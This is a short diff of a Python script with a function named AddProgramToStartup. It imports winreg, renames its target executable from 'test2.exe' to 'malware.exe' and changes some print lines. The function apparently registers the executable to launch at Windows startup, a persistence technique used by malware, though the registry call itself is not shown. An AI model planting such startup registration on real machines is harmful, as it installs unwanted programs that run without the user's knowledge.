@@ -8,7 +8,7 @@ from winreg import *
 def AddProgramToStartup():
 
     fp=os.path.dirname(os.path.realpath(__file__))
-    file_name ="test2.exe"
+    file_name ="malware.exe"
 
     new_file_path = fp+"\\"+file_name
 
@@ -26,6 +26,12 @@ def AddProgramToStartup():
 
 AddProgramToStartup()
 print(1)
+print(2)
+print(3)
+print(4)
+print(5)
+print(4)
+print(3)
+print(2)
 print(1)
-print(1)
-print(1)
+
